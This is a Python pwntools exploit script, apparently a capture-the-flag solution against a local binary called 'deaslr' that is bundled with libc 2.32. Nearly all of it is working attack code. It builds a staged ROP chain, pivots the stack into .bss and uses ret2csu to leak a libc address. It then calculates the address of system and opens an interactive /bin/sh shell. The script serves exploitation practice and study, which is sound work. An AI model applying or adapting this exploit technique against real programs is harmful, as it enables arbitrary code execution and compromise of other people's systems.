#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
#context.log_level = 'debug'

elf  = ELF('./deaslr')
libc = ELF('./libc-2.32.so')

# ROP Gadgets
__libc_csu_init = elf.symbols['__libc_csu_init']
gadget1 = __libc_csu_init + 64  # mov rdx, r13; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12+rbx*8]
gadget2 = __libc_csu_init + 90  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget3 = 0x4005c3  # pop rdi ; ret
gadget4 = 0x4005bd  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
gadget5 = 0x4005bc  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget6 = 0x40054f  # mov eax, 0x0 ; leave ; ret
gadget7 = __libc_csu_init + 94
gadget8 = 0x4004a0  # pop rbp ; ret
gadget9 = 0x4003f9  # ret  (for stack alignment)

# Byte sequence alias
# usually only A8 is needed, but we can use different byte sequences to assist in debugging.
A8 = 8 * b'A'
B8 = 8 * b'B'
C8 = 8 * b'C'


def main():
    proc = process(['./ld-2.32.so', './deaslr'], env={'LD_PRELOAD': './libc-2.32.so'})
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    buf = elf.bss() + 0x100

    # migrate stack to .bss
    payload =  3 * A8                       # padding
    payload += p64(gadget3)                 # ret
    payload += p64(buf)                     # rdi
    payload += p64(gadget9)                 # ret (stack alignment)
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget4)                 # ret
    payload += p64(buf)                     # rsp (new)
    proc.sendline(payload)

    # write to new stack (on .bss)
    payload =  3 * A8                       # padding
    payload += p64(gadget9)                 # ret (stack alignment)
    payload += p64(elf.sym['main'])         # ret
    payload += 0x50 * b'\x00'               # padding to stage2 rop chain
    payload += 0xf0 * b'\x00'
    payload += b'\x00' * 0x100              # some padding to prevent the file struct from being partially modified
    # Stage3
    # ************************************************************
    payload += p64(8)                       # r13 -> rdx (third arg) - write 8 bytes
    payload += p64(0x6010c8)                # r14 -> rsi (second arg) - contains the real address of stdin
    payload += p64(0x601438)                # r15 -> edi (first arg) - stdout
    payload += p64(gadget8)                 # ret
    payload += p64(0x79 + 1)                # rbp
    payload += p64(gadget1)                 # ret2csu
    payload += 7 * A8                       # padding
    payload += p64(gadget8)                 # ret
    payload += p64(0x6013f0)                # rbp
    payload += p64(gadget6)                 # ret
    payload += p64(gadget3)                 # ret
    payload += p64(0x6017c0)                # rdi
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget4)                 # ret
    payload += p64(0x601798)                # rsp (new) 
    payload += 3 * p64(0)
    payload += b'\x00' * 0x70 + p64(1) + p64(2) + b'\x00' * 0x70
    payload += b'\x00' * 0x200
    # Stage2
    # *************************************************************
    payload += 3 * A8                       # padding
    payload += p64(gadget3)                 # ret
    payload += p64(0x6010b0)                # rdi
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget3)                 # ret
    payload += p64(0x6010e8)                # rdi
    payload += p64(gadget8)                 # ret
    payload += p64(0x601778)                # rbp
    payload += p64(gadget6)                 # ret
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget4)                 # ret
    payload += p64(0x601098)                # rsp (new)
    # Stage4
    # ************************************************************
    payload += 3 * A8                       # padding
    payload += p64(gadget3)                 # ret
    payload += p64(0x6017d0)                # rdi -> b'/bin/sh\x00'
    payload += p64(0)                       # ret to system@libc (modified at last via gets())
    payload += p64(0)                       # unused
    payload += b'/bin/sh\x00'
    proc.sendline(payload)

    # we execute main() again, but this time our stack is on .bss
    # note that main() will execute gets() again.
    payload =  3 * p64(0x601158)            # padding
    payload += p64(gadget4)                 # recope
    payload += p64(0x601728)                # rsp (new) -> pivot to stage 2
    proc.sendline(payload)

    #injected_rbx = p64(int( (libc.sym['_IO_file_write']-libc.sym['stdin']) / 8), signed=True)
    injected_rbx = p64(0x79)
    new_rsp = p64(0x601378)
    proc.sendline(p64(gadget2) + injected_rbx)
    proc.sendline(p64(gadget4) + new_rsp)

    libc_stdin = u64(proc.recv(8))
    libc_base  = libc_stdin - 0x1c3610
    libc_system = libc_base + 0x4a830
    log.info('stdin@libc: {}'.format(hex(libc_stdin)))
    log.info('libc base address: {}'.format(hex(libc_base)))
    log.info('system@libc: {}'.format(hex(libc_system)))

    proc.sendline(p64(libc_system))

    proc.interactive()



if __name__ == '__main__':
    main()
